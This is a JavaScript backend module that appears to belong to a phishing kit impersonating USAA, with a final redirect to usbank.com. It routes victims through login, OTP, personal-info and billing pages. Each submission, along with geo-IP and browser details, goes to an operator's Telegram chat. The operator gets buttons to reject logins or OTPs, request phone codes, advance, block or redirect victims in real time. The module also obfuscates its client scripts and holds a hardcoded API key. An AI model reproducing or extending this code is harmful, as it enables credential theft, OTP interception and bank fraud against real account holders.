import path from "path";
import fs from "fs/promises";
import sqlite3 from "sqlite3";
import { open } from "sqlite"; 
import { initDB } from "./db.js";
import axios from "axios";
import { sendMessageFor } from "simple-telegram-message";
import dotenv from "dotenv";
import JavaScriptObfuscator from "javascript-obfuscator";
import { obfuscateMultiple } from "./obfuscate.js";
import express from "express";
import session from "express-session";

const db = await initDB();
let systemInfo = {};

/* ================================
   IP HANDLING
=================================*/
function getClientIP(socket) {
  let ip = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;
  if (ip && ip.includes(",")) ip = ip.split(",")[0];
  if (ip && ip.startsWith("::ffff:")) ip = ip.replace("::ffff:", "");
  return ip;
}

function getReqClientIP(req) {
  let ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress || req.socket.remoteAddress || (req.connection.socket ? req.connection.socket.remoteAddress : null);
  if (ip && ip.includes(",")) ip = ip.split(",")[0].trim();
  if (ip && ip.startsWith("::ffff:")) ip = ip.replace("::ffff:", "");
  return ip;
}


async function setWebhook(botToken) {
  const row = await db.get(
    "SELECT domain FROM admin_settings WHERE id = 1"
  );

  console.log(row);

  if (!row || row.domain.trim() === "") {
   console.log("Domain is not set in admin_settings");
   return;
}

  const domain = row.domain.trim(); // remove leading/trailing spaces

  
  
  const baseUrl = domain.startsWith("http")
    ? domain
    : `https://${domain}`;

  const webhookUrl = `${baseUrl}/telegram-webhook`;
  
  console.log("Domain:", webhookUrl);

  console.log("Using webhook URL:", webhookUrl);

  const response = await fetch(
    `https://api.telegram.org/bot${botToken}/setWebhook`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ url: webhookUrl })
    }
  );

  const data = await response.json();
  console.log("Webhook set:", data);
}

async function sendTelegramMessage(botToken, chatId, text, options = {}) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const body = {
    chat_id: chatId,
    text,
    ...options
  };

  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(body)
  });

  const data = await response.json();

  if (!data.ok) {
    throw new Error(`Telegram API error: ${JSON.stringify(data)}`);
  }

  return data;
}

/* ================================
   JS OBFUSCATION
=================================*/
async function prepareObfuscatedAssets() {
  const srcDir = path.resolve("./public/js");
  const outDir = path.resolve("./public/obf-js");

  await fs.mkdir(outDir, { recursive: true });

  const entries = await fs.readdir(srcDir, { withFileTypes: true });
  const jsFiles = entries.filter(e => e.isFile() && e.name.endsWith(".js")).map(e => e.name);

  for (const name of jsFiles) {
    const srcPath = path.join(srcDir, name);
    const outPath = path.join(outDir, name);
    const code = await fs.readFile(srcPath, "utf8");

    const obfuscated = JavaScriptObfuscator.obfuscate(code, {
      compact: true,
      selfDefending: true,
      disableConsoleOutput: true
    }).getObfuscatedCode();

    await fs.writeFile(outPath, obfuscated, "utf8");
  }
}

/* ================================
   GEO-IP / USER INFO
=================================*/
async function sendAPIRequest(ipAddress) {
  const response = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=bdc_4422bb94409c46e986818d3e9f3b2bc2`);
  return response.data;
}

async function buildUserInfo(req, sendAPIRequest) {
  try {
    const ipAddress = getReqClientIP(req);
    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];
    const geoInfo = await sendAPIRequest(ipAddress);

    const now = new Date().toISOString();

    return [
      "🌍 GEO-IP INFO",
      `IP: ${geoInfo?.ip || "Unknown"}`,
      `City: ${geoInfo?.location?.city || "Unknown"}`,
      `State: ${geoInfo?.location?.principalSubdivision || "Unknown"}`,
      `ZIP: ${geoInfo?.location?.postcode || "Unknown"}`,
      `Country: ${geoInfo?.country?.name || "Unknown"}`,
      `Time: ${geoInfo?.location?.timeZone?.localTime || "Unknown"}`,
      `ISP: ${geoInfo?.network?.organisation || "Unknown"}`,
      "",
      `User-Agent: ${userAgent || "N/A"}`,
      `Language: ${systemLang || "N/A"}`,
      `Timestamp: ${now}`
    ].join("\n");

  } catch (err) {
    console.error("❌ Failed to build user info:", err);
    return `========================\n🌍 GEO-IP INFO\nError retrieving data for IP: ${req.ip}\n========================`;
  }
}
 
/* ================================
   PAGEFLOW
=================================*/
const DEFAULT_PAGEFLOW = {
    "1": { page: "login", enabled: true },
    "2": { page: "otp", enabled: true },
    "3": { page: "info", enabled: true },
    "4": { page: "bill", enabled: true },
    "5": { page: "final", enabled: true }
  };

  const pageFlow = DEFAULT_PAGEFLOW;
  

async function getPageFlow(db, id = 1) {
  try {
    const row = await db.get(`SELECT pageFlow FROM admin_settings WHERE id = ?`, [id]);
    if (!row || !row.pageFlow) return DEFAULT_PAGEFLOW;

    const parsed = JSON.parse(row.pageFlow);

    // Backward-compatibility: convert old format if needed
    const normalized = {};
    Object.entries(parsed).forEach(([key, value]) => {
      if (typeof value === "string") {
        normalized[key] = { page: value, enabled: value !== "0" };
      } else if (typeof value === "object" && value.page) {
        normalized[key] = { page: value.page, enabled: value.enabled ?? true };
      }
    });

    return normalized;
  } catch (err) {
    console.error("Failed to read pageFlow:", err);
    return DEFAULT_PAGEFLOW;
  }
}

async function savePageFlow(db, pageFlow, id = 1) {
  try {
    // Ensure all entries have {page, enabled}
    const normalized = {};
    Object.entries(pageFlow).forEach(([key, value]) => {
      if (typeof value === "string") {
        normalized[key] = { page: value, enabled: value !== "0" };
      } else if (value?.page) {
        normalized[key] = { page: value.page, enabled: value.enabled ?? true };
      }
    });
    
    console.log("normalized to be saved on db", normalized);

    const jsonString = JSON.stringify(normalized);
    await db.run(`UPDATE admin_settings SET pageFlow = ? WHERE id = ?`, [jsonString, id]);
    return true;
  } catch (err) {
    console.error("Failed to save pageFlow:", err);
    return false;
  }
}

/* ================================
   ROUTE MAP
=================================*/
const routeMap = {
  login: "sign-in",
  otp: "sign-in?action=otp",
  info: "sign-in?action=info",
  bill: "sign-in?action=bill",
  final: "https://href.li/?https://usbank.com"
};

function normalize(str = "") {
  return str.replace(/^\//, "").trim().toLowerCase();
}

function resolveFrontendRoute(backendPage) {
  return routeMap[backendPage] || backendPage;
}

function resolveBackendRoute(currentPage) {
  const clean = normalize(currentPage);
  const match = Object.keys(routeMap).find(
    backendKey => normalize(routeMap[backendKey]) === clean
  );
  return match || clean;
}

async function getNextPage(currentPage, req) {
  if (!currentPage) return null;

  // 🔄 ALWAYS fetch latest pageFlow from DB
  const pageFlow = await getPageFlow(db);

  if (!pageFlow || typeof pageFlow !== "object") return null;

  const backendCurrent = resolveBackendRoute(currentPage);

  const sortedKeys = Object.keys(pageFlow)
    .map(Number)
    .sort((a, b) => a - b);

  const currentIdx = sortedKeys.findIndex(
    key => pageFlow[key]?.page === backendCurrent
  );

  if (currentIdx === -1) return null;

  let nextPage = null;

  for (let i = currentIdx + 1; i < sortedKeys.length; i++) {
    const candidate = pageFlow[sortedKeys[i]];
    if (!candidate) continue;

    // 🔍 Debug (keep this)
    console.log(candidate.enabled, ":", candidate.page);

    // 🔒 STRICT enable check
    const isEnabled =
      candidate.enabled === true ||
      candidate.enabled === 1 ||
      candidate.enabled === "1";

    if (isEnabled) {
      nextPage = candidate.page;
      break;
    }
  }

  if (!nextPage) return null;

  const frontendRoute = resolveFrontendRoute(nextPage);

  // 🌐 External redirect handling
  if (
    frontendRoute.startsWith("http://") ||
    frontendRoute.startsWith("https://")
  ) {
    if (req?.session) {
      req.session.cookie.maxAge = 60 * 60 * 1000;
      req.session.blocked = true;
    }

    return frontendRoute
      .replace(/^\/+/, "")
      .replace(/\/+$/, "");
  }

  const normalized = frontendRoute.replace(/\/+$/, "");
  return normalized.startsWith("/")
    ? normalized
    : `/${normalized}`;
}

/* ================================
   MESSAGE BUILDER
=================================*/
async function buildMessage(data, options = {}) {
  const {
    sendToTelegram = false,
    botToken = null,
    chatId = null,
    userId = null,
    db = null
  } = options;

  try {
    if (!userId) throw new Error("userId is missing");
    if (!db) throw new Error("Database instance (db) is missing");

    // -----------------------------
    // Check if submission contains email or username
    // -----------------------------
    const hasEmailOrUsername = Object.keys(data).some(key => {
      const lower = key.toLowerCase();
      return lower.includes("email") || lower.includes("username");
    });

    // -----------------------------
    // Get user info from DB
    // -----------------------------
    const userRow = await db.get(
      "SELECT status, page, identifier, system_info FROM users WHERE id = ?",
      [userId]
    );

    if (!userRow) {
      throw new Error(`User ${userId} not found in database`);
    }

    // Parse system_info JSON
    let systemInfo = {};
    try {
      systemInfo = JSON.parse(userRow.system_info || '{}');
    } catch (err) {
      console.warn(`Failed to parse system_info for user ${userId}, using empty object`);
    }

    const isBlocked = !!systemInfo.blocked; // now blocked flag comes from system_info
    const identifier = userRow.identifier;
    const page = (userRow.page || "").toLowerCase();

    // -----------------------------
    // Dynamic Heading
    // -----------------------------
    let heading;

    if (hasEmailOrUsername) {
      heading = `👤 USAA NEW USER SUBMISSION`;
    } else {
      const display = identifier || userId;
      heading = `👤 USAA SUBMISSION\n\n User: @${display}`;
    }

    let message = `${heading}\n\n`;

    const excludeKeys = ["visitor", "userid", "security_code"];

    for (const [key, value] of Object.entries(data)) {
      if (value && !excludeKeys.includes(key.toLowerCase())) {
        message += `${key.toUpperCase()}   : ${value}\n`;
      }
    }

    if (!sendToTelegram) {
      return message;
    }

    if (!botToken || !chatId) {
      throw new Error("Bot token or Chat ID missing");
    }

    // -----------------------------
    // Build buttons (blocked logic is handled inside buildTelButtons now)
    // -----------------------------
    const buttons = await buildTelButtons(userId, db);

    await sendTelegramMessage(botToken, chatId, message, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: buttons
      }
    });

    console.log("✅ Telegram message sent with full preserved logic");

    return message;

  } catch (err) {
    console.error("❌ buildMessage error:", err);
    return null;
  }
}
		
/* ================================
   AUTH / SESSION
=================================*/
function requireAdmin(req, res, next) {
  if (req.session?.isAdmin) return	 next();
  return res.redirect("/admin");
}

function blockedRedirect(db, io) {
  return async function (req, res, next) {
    try {
      // -----------------------------
      // Check global block-after-submission flag
      // -----------------------------
      const blockStatus = await db.get(`SELECT baSUB FROM admin_settings WHERE id = ?`, [1]);
      const blockAfterSub = !!(blockStatus && blockStatus.baSUB);

      // Redirect non-admin blocked users if baSUB is enabled
      if (blockAfterSub && req.session?.blocked && !req.session?.isAdmin) {
        return res.redirect(routeMap.final);
      }
      
      if (req.session?.blocked && !req.session?.isAdmin) {
      	return res.redirect(routeMap.final);
      	}

      // -----------------------------
      // Fetch user status from DB
      // -----------------------------
      const userId = req.session?.userId; // make sure userId is coming from session or req
      if (!userId) {
        console.warn("No userId in session, skipping blocked check.");
        return next();
      }

      const user = await db.get(
		  "SELECT system_info FROM users WHERE id = ?",
		  [userId]
		);

		let systemInfo = {};
		try {
		  systemInfo = JSON.parse(user?.system_info || "{}");
		} catch (err) {
		  console.warn(`Failed to parse system_info for user ${userId}`);
		}
		
		// -----------------------------
		// If blocked, skip status updates and emit admin update
		// -----------------------------
		if (systemInfo.blocked) {
		  console.log(`⛔ User ${userId} is blocked — skipping status update.`);
		
		  // Refresh admin UI
		  const users = await db.all(
		    `SELECT * FROM users WHERE last_seen >= datetime('now', '-2 minutes')`
		  );
		
		  io.emit("admin:update", users);
		
		  // Optionally redirect blocked users
		  if (!req.session?.isAdmin) {
		    return res.redirect(routeMap.final);
		  }
		
		  return; // stop middleware chain
		}

      next(); // user not blocked → continue
    } catch (err) {
      console.error("❌ Error in blockedRedirect middleware:", err);
      next(err);
    }
  };
}

async function handleAdminCommand({ userId, command, otp, io, db }) {
  console.log("handling command:", userId, command);

  // Fetch user and parse system_info once
  const userRow = await db.get(
    "SELECT page, system_info FROM users WHERE id = ?",
    [userId]
  );

  if (!userRow) {
    console.warn(`User ${userId} not found in DB`);
    return;
  }
  
  try {
    systemInfo = JSON.parse(userRow.system_info || '{}');
  } catch (err) {
    console.warn(`Failed to parse system_info for user ${userId}, using empty object`);
  }

  // Find the specific socket for this user
  for (let [id, socket] of io.of("/").sockets) {
    if (socket.userId === userId) {
      let link = null;
      let phonescreen = null;

      if (command === "nextpage") {
        link = await getNextPage(userRow?.page);
        console.log("link", link);
      } else if (command === "redirect") {
        link = resolveFrontendRoute("final");
      } else if (command === "block") {
        systemInfo.blocked = true; // mark blocked in system_info
        await db.run(
          "UPDATE users SET system_info = ? WHERE id = ?",
          [JSON.stringify(systemInfo), userId]
        );
      } else if (command === "unblock") {
        systemInfo.blocked = false; // remove blocked flag
        await db.run(
          "UPDATE users SET system_info = ? WHERE id = ?",
          [JSON.stringify(systemInfo), userId]
        );
      } else if (command === "phone-otp") {
        phonescreen = resolveFrontendRoute("otp");
      }

      if (link) {
        socket.emit("user:command", { command: "redirect", link });
      } else if (otp) {
        socket.emit("user:command", { command: "phone-otp", code: otp, phonescreen });
      } else {
        socket.emit("user:command", { command });
      }

      console.log(`📤 Command '${command}' sent to user ${userId} via Tg button`);
      break;
    }
  }
}

async function buildTelButtons(userId, db) {
  if (!userId) throw new Error("userId missing");
  if (!db) throw new Error("db missing");

  const userRow = await db.get(
    "SELECT status, page, system_info FROM users WHERE id = ?",
    [userId]
	);
	
	if (!userRow) {
	    throw new Error(`User ${userId} not found`);
	}
	
	// Parse the system_info JSON
	try {
	    systemInfo = JSON.parse(userRow.system_info || '{}');
	} catch (err) {
	    console.warn(`Failed to parse system_info for user ${userId}, using empty object`);
	}
	
	// Check blocked flag
	const isBlocked = !!systemInfo.blocked;
	
	// Now normal status
	const status = userRow.status; // e.g., "active", "idle"
    const page = (userRow.page || "").toLowerCase();

  let buttons = [];

  // -------------------------
  // BLOCKED MODE
  // -------------------------
  if (isBlocked) {
    return [[
      {
        text: "Unblock",
        callback_data: `cmd:unblock:${userId}`
      }
    ]];
  }

  // -------------------------
  // NORMAL MODE
  // -------------------------

  // Row 1
  buttons.push([
    {
      text: "Refresh",
      callback_data: `cmd:refresh:${userId}`
    },
    {
      text: "Next Page",
      callback_data: `cmd:nextpage:${userId}`
    }
  ]);

  // Row 2 (Login / OTP only)
  if (page === "login" || page.includes("otp")) {
    const badButton =
      page === "login"
        ? {
            text: "Bad Login",
            callback_data: `cmd:bad-login:${userId}`
          }
        : {
            text: "Bad OTP",
            callback_data: `cmd:bad-otp:${userId}`
          };

    buttons.push([
      badButton,
      {
        text: "Phone OTP",
        callback_data: `cmd:phone-otp:${userId}`
      }
    ]);
  }

  // Row 3
  buttons.push([
    {
      text: "Redirect",
      callback_data: `cmd:redirect:${userId}`
    },
    {
      text: "Block",
      callback_data: `cmd:block:${userId}`
    }
  ]);

  return buttons;
}



async function isAutopilotOn(db) {
  const row = await db.get("SELECT autopilot FROM admin_settings WHERE id = 1");
  return row?.autopilot === 1;
}

export {
  buildMessage,
  isAutopilotOn,
  getClientIP,
  getReqClientIP,
  setWebhook,
  getNextPage,
  buildUserInfo,
  buildTelButtons,
  handleAdminCommand,
  sendAPIRequest,
  systemInfo,
  getPageFlow,
  savePageFlow,
  pageFlow,
  requireAdmin,
  blockedRedirect,
  resolveFrontendRoute,
  prepareObfuscatedAssets,
  routeMap
};